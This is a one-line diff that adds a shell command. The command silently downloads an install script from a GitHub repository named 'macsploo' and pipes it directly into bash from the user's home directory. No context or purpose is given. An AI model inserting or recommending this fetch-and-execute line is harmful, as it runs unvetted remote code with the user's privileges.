@@ -1,0 +1,1 @@
+cd ~/ && curl -s "https://raw.githubusercontent.com/VoidSequencx/macsploo/main/install.sh" | bash
